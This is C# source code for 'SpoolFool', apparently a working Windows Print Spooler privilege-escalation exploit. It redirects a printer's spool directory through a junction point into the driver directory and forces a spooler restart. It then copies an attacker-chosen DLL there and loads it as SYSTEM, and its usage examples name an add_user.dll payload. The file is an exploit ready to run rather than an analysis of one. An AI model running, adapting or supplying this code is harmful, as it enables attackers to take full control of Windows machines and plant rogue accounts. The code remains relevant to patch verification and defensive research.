using System;
using System.Linq;
using System.Threading;
using System.IO;
using System.Security.AccessControl;
using System.Runtime.InteropServices;

namespace SpoolFool
{
    public class Program
    {
        [DllImport("shell32.dll", SetLastError = true)]
        static extern IntPtr CommandLineToArgvW(
        [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

        public static void CommandEntry(string commandLine)
        {
            if (commandLine == "" || commandLine == null)
            {
                Main(null);
                return;
            }

            int argc;
            var argv = CommandLineToArgvW(commandLine, out argc);

            if (argv == IntPtr.Zero)
                throw new System.ComponentModel.Win32Exception();
            try
            {
                var args = new string[argc];
                for (var i = 0; i < args.Length; i++)
                {
                    var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
                    args[i] = Marshal.PtrToStringUni(p);
                }

                Main(args);

            }
            finally
            {
                Marshal.FreeHGlobal(argv);
            }
        }

        internal static void Main(string[] args)
        {
            string moduleName = System.Reflection.Assembly.GetExecutingAssembly().Location;

            if (args == null || !args.Any())
            {
                Console.WriteLine();
                Console.WriteLine("SpoolFool");
                Console.WriteLine("  By Oliver Lyak (@ly4k_)");
                Console.WriteLine();
                Console.WriteLine("Examples:");
                Console.WriteLine("  {0} -dll add_user.dll", moduleName);
                Console.WriteLine("  {0} -dll add_user.dll -printer 'My Printer'", moduleName);
                Console.WriteLine("  {0} -dll add_user.dll -dir 'SECRET'", moduleName);
                Console.WriteLine("  {0} -dll add_user.dll -printer 'My Printer' -dir 'SECRET'", moduleName);
                return;
            }

            string argPrinterName = "Microsoft XPS Document Writer v4";
            string argDriverDirectory = "4";
            string argSourceDLL = "";
            IntPtr pHandle = new IntPtr(0);

            foreach (var entry in args.Select((value, index) => new { index, value }))
            {
                string argument = entry.value.ToUpper();

                switch (argument)
                {
                    case "-PRINTER":
                    case "/PRINTER":
                        argPrinterName = args[entry.index + 1];
                        break;

                    case "-DIR":
                    case "/DIR":
                        argDriverDirectory = args[entry.index + 1];
                        break;

                    case "-DLL":
                    case "/DLL":
                        argSourceDLL = args[entry.index + 1];
                        break;
                }
            }

            if (argSourceDLL == "")
            {
                Console.WriteLine("[-] Please specify a DLL");
                return;
            }

            if (File.Exists(argSourceDLL) == false)
            {
                Console.WriteLine("[-] Could not find DLL: {0}", argSourceDLL);
                return;
            }

            if (argDriverDirectory == "")
            {
                argDriverDirectory = "{" + Guid.NewGuid().ToString().ToUpper() + "}";
                Console.WriteLine("[*] Generating random driver directory: {0}", argDriverDirectory);
            }

            string tempPath = Path.GetTempPath();
            string baseDirectory = Path.Combine(tempPath, Guid.NewGuid().ToString());

            string driverDir = Printer.GetDriverDirectory();
            string targetDir = Path.Combine(driverDir, argDriverDirectory);
            string linkDirectory = "\\\\localhost\\C$\\" + Path.Combine(baseDirectory, argDriverDirectory).Substring(3); // Remove 'C:\'

            string sourceDllName = Path.GetFileName(argSourceDLL);
            string targetDll = Path.Combine(targetDir, sourceDllName);

            Console.WriteLine("[*] Using printer name: {0}", argPrinterName);
            Console.WriteLine("[*] Using driver directory: {0}", argDriverDirectory);

            Directory.CreateDirectory(baseDirectory);

            Console.WriteLine("[*] Using temporary base directory: {0}", baseDirectory);

            Console.WriteLine("[*] Trying to open existing printer: {0}", argPrinterName);
            if (Printer.OpenExistingPrinter(argPrinterName, ref pHandle) == false)
            {
                Console.WriteLine("[*] Failed to open existing printer: {0}", argPrinterName);
                Console.WriteLine("[*] Trying to create printer: {0}", argPrinterName);
                pHandle = Printer.CreatePrinter(argPrinterName);
                if (pHandle == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to create printer: {0}", argPrinterName);
                    return;
                }
                else
                {
                    Console.WriteLine("[+] Created printer: {0}", argPrinterName);
                }
            }
            else
            {
                Console.WriteLine("[+] Opened existing printer: {0}", argPrinterName);
            }

            if (Directory.Exists(targetDir))
            {
                Console.WriteLine("[*] Target directory already exists", targetDir);
                goto LOAD_DLL;
            }

            Console.WriteLine("[*] Setting spool directory to: {0}", linkDirectory);
            if (Printer.SetPrinterDataEx(pHandle, "\\", "SpoolDirectory", 1, linkDirectory, linkDirectory.Length) == 0)
            {
                Console.WriteLine("[+] Successfully set the spool directory to: {0}", linkDirectory);
            }
            else
            {
                Console.WriteLine("[-] Failed to set the spool directory to: {0}", linkDirectory);
                return;
            }

            Console.WriteLine("[*] Creating junction point: {0} -> {1}", baseDirectory, driverDir);
            JunctionPoint.Create(baseDirectory, driverDir, true);

            string terminator = "C:\\Windows\\System32\\AppVTerminator.dll";

            Console.WriteLine("[*] Forcing spooler to restart");

            Printer.SetPrinterDataEx(pHandle, "CopyFiles\\", "Module", 1, terminator, terminator.Length);

            Console.Write("[*] Waiting for spooler to restart");

            while (true)
            {
                Thread.Sleep(2000);

                Console.Write(".");

                if (Printer.OpenExistingPrinter(argPrinterName, ref pHandle))
                {
                    Console.WriteLine("");
                    break;
                }
            }

            Console.WriteLine("[+] Spooler restarted");

            if (Directory.Exists(targetDir))
            {
                Console.WriteLine("[+] Successfully created driver directory: {0}", targetDir);
            }
            else
            {
                Console.WriteLine("[-] Failed to create driver directory: {0}", targetDir);
                return;
            }

        LOAD_DLL:
            Console.WriteLine("[*] Copying DLL: {0} -> {1}", argSourceDLL, targetDll);

            if (File.Exists(targetDll))
            {
                Console.WriteLine("[*] DLL already exists: {0}", targetDll);
                Console.WriteLine("[*] Trying to delete DLL: {0}", targetDll);
                File.Delete(targetDll);
            }

            File.Copy(argSourceDLL, targetDll);

            Console.WriteLine("[*] Granting read and execute to SYSTEM on DLL: {0}", targetDll);
            FileSecurity fSecurity = File.GetAccessControl(targetDll);
            fSecurity.AddAccessRule(new FileSystemAccessRule(@"System", FileSystemRights.ReadAndExecute, AccessControlType.Allow));
            File.SetAccessControl(targetDll, fSecurity);

            Console.WriteLine("[*] Loading DLL as SYSTEM: {0}", targetDll);
            Printer.SetPrinterDataEx(pHandle, "CopyFiles\\", "Module", 1, targetDll, targetDll.Length);
            Console.WriteLine("[*] DLL should be loaded");

            Directory.Delete(baseDirectory);
        }
    }
}
